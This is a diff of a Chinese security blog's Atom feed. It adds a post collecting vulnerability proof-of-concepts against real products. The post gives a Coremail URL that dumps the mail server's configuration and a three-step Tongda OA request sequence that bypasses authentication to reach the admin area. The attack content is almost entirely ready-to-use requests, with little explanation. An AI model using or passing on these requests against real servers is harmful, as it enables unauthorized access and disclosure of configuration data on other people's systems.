@@ -6,7 +6,7 @@
   <link href="https://whmsec.github.io/atom.xml" rel="self"/>
   
   <link href="https://whmsec.github.io/"/>
-  <updated>2021-03-05T11:02:38.464Z</updated>
+  <updated>2021-03-08T11:46:41.906Z</updated>
   <id>https://whmsec.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>漏洞类型积累</title>
+    <link href="https://whmsec.github.io/2021/03/08/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E7%A7%AF%E7%B4%AF/"/>
+    <id>https://whmsec.github.io/2021/03/08/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E7%A7%AF%E7%B4%AF/</id>
+    <published>2021-03-08T05:48:22.000Z</published>
+    <updated>2021-03-08T11:46:41.906Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>这里记录一下遇到的漏洞及poc</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h3 id="Coremail邮件系统配置文件信息泄露"><a href="#Coremail邮件系统配置文件信息泄露" class="headerlink" title="Coremail邮件系统配置文件信息泄露"></a>Coremail邮件系统配置文件信息泄露</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;mailsms&#x2F;s?func&#x3D;ADMIN:appState&amp;dumpConfig&#x3D;&#x2F;</span><br></pre></td></tr></table></figure><h3 id="通达OA未授权访问"><a href="#通达OA未授权访问" class="headerlink" title="通达OA未授权访问"></a>通达OA未授权访问</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.先访问http://xxx.xxx.xxx/mobile/auth_mobi.php?isAvatar=1&amp;uid=1&amp;P_VER=0，如果出现空白，说明已经获得权限；</span><br><span class="line">2.在访问http://xxx.xxx.xxx/general/ ,成功进入系统</span><br><span class="line">3.如果出现RELOGIN,则说明目前没有人在线,需要等待有人登录的时候在尝试</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">&lt;blockquote class=&quot;blockquote-center&quot;&gt;
+            &lt;i class=&quot;fa fa-quote-left&quot;&gt;&lt;/i&gt;
+            &lt;p&gt;这里记录一下遇到的漏洞及poc&lt;/p&gt;
+
+            &lt;i class=&quot;fa fa-quote-right&quot;&gt;&lt;/i&gt;
+          &lt;/blockquote&gt;</summary>
+    
+    
+    
+    
+    <category term="漏洞" scheme="https://whmsec.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
   
   <entry>
     <title>谷歌云机器运维</title>
